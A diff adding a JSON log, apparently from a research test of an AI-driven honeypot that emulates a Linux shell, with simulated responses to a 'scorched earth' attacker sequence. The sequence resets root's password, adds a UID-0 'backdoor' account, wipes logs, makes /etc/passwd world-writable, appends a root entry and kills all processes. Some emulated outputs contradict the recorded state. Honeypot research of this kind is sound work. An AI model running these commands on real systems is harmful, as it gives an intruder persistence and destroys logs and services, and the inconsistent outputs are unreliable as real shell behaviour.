@@ -1,0 +1,74 @@
+[
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 1,
+    "cmd": "passwd root",
+    "response": "Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully",
+    "fi": 4,
+    "latency_ms": 1919.12,
+    "prompt_usr": "Current date: 2026-04-19 19:58:33\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rw-r--r--  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nNo prior impactful interactions.\n\n=== Current Attacker Command (Qi) ===\npasswd root"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 2,
+    "cmd": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
+    "response": "",
+    "fi": 4,
+    "latency_ms": 1412.28,
+    "prompt_usr": "Current date: 2026-04-19 19:58:35\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rw-r--r--  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\n\n\n=== Current Attacker Command (Qi) ===\nuseradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 3,
+    "cmd": "rm -rf /var/log/*",
+    "response": "rm: cannot remove '/var/log': Is a directory",
+    "fi": 4,
+    "latency_ms": 1943.14,
+    "prompt_usr": "Current date: 2026-04-19 19:58:36\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rw-r--r--  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\nCommand: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor\nResponse: (command executed successfully, no output)\n\n\n\n=== Current Attacker Command (Qi) ===\nrm -rf /var/log/*"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 4,
+    "cmd": "chmod 777 /etc/passwd",
+    "response": "",
+    "fi": 4,
+    "latency_ms": 1437.42,
+    "prompt_usr": "Current date: 2026-04-19 19:58:38\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rw-r--r--  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\nCommand: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor\nResponse: (command executed successfully, no output)\n\nCommand: rm -rf /var/log/*\nResponse: rm: cannot remove '/var/log': Is a directory\n\n\n\n=== Current Attacker Command (Qi) ===\nchmod 777 /etc/passwd"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 5,
+    "cmd": "ls -la /etc/passwd",
+    "response": "-rw-r--r-- 1 root root 2.1K Apr 19 19:58 /etc/passwd",
+    "fi": 0,
+    "latency_ms": 2729.36,
+    "prompt_usr": "Current date: 2026-04-19 19:58:40\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rwxrwxrwx  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\nCommand: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor\nResponse: (command executed successfully, no output)\n\nCommand: rm -rf /var/log/*\nResponse: rm: cannot remove '/var/log': Is a directory\n\nCommand: chmod 777 /etc/passwd\nResponse: (command executed successfully, no output)\n\n\n\n=== Current Attacker Command (Qi) ===\nls -la /etc/passwd"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 6,
+    "cmd": "echo 'root:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
+    "response": "",
+    "fi": 4,
+    "latency_ms": 1558.77,
+    "prompt_usr": "Current date: 2026-04-19 19:58:43\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rwxrwxrwx  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\nCommand: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor\nResponse: (command executed successfully, no output)\n\nCommand: rm -rf /var/log/*\nResponse: rm: cannot remove '/var/log': Is a directory\n\nCommand: chmod 777 /etc/passwd\nResponse: (command executed successfully, no output)\n\nCommand: ls -la /etc/passwd\nResponse: -rw-r--r-- 1 root root 2.1K Apr 19 19:58 /etc/passwd\n\n\n\n=== Current Attacker Command (Qi) ===\necho 'root:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 7,
+    "cmd": "cat /etc/passwd | tail -3",
+    "response": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash\nbackdoor:x:0:0:backdoor:/root:/bin/bash",
+    "fi": 0,
+    "latency_ms": 3711.81,
+    "prompt_usr": "Current date: 2026-04-19 19:58:44\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rwxrwxrwx  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\nCommand: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor\nResponse: (command executed successfully, no output)\n\nCommand: rm -rf /var/log/*\nResponse: rm: cannot remove '/var/log': Is a directory\n\nCommand: chmod 777 /etc/passwd\nResponse: (command executed successfully, no output)\n\nCommand: ls -la /etc/passwd\nResponse: -rw-r--r-- 1 root root 2.1K Apr 19 19:58 /etc/passwd\n\nCommand: echo 'root:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nResponse: (command executed successfully, no output)\n\n\n\n=== Current Attacker Command (Qi) ===\ncat /etc/passwd | tail -3"
+  },
+  {
+    "theme_id": "theme6_scorched_earth",
+    "index": 8,
+    "cmd": "kill -9 -1",
+    "response": "",
+    "fi": 4,
+    "latency_ms": 1757.88,
+    "prompt_usr": "Current date: 2026-04-19 19:58:48\n\n=== System State Register (SRi) ===\nfile exists: /etc/passwd  permissions=-rwxrwxrwx  size=2.1K\nfile exists: /etc/shadow  permissions=-rw-r-----  size=1.4K\nfile exists: /var/log  permissions=drwxr-xr-x  size=4.0K\n\n=== Interaction History (Hi) ===\nPrevious impactful interactions:\nCommand: passwd root\nResponse: Enter new UNIX password: \nRetype new UNIX password: \npasswd: password updated successfully\n\nCommand: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor\nResponse: (command executed successfully, no output)\n\nCommand: rm -rf /var/log/*\nResponse: rm: cannot remove '/var/log': Is a directory\n\nCommand: chmod 777 /etc/passwd\nResponse: (command executed successfully, no output)\n\nCommand: ls -la /etc/passwd\nResponse: -rw-r--r-- 1 root root 2.1K Apr 19 19:58 /etc/passwd\n\nCommand: echo 'root:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nResponse: (command executed successfully, no output)\n\nCommand: cat /etc/passwd | tail -3\nResponse: root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash\nbackdoor:x:0:0:backdoor:/root:/bin/bash\n\n\n\n=== Current Attacker Command (Qi) ===\nkill -9 -1"
+  }
+]
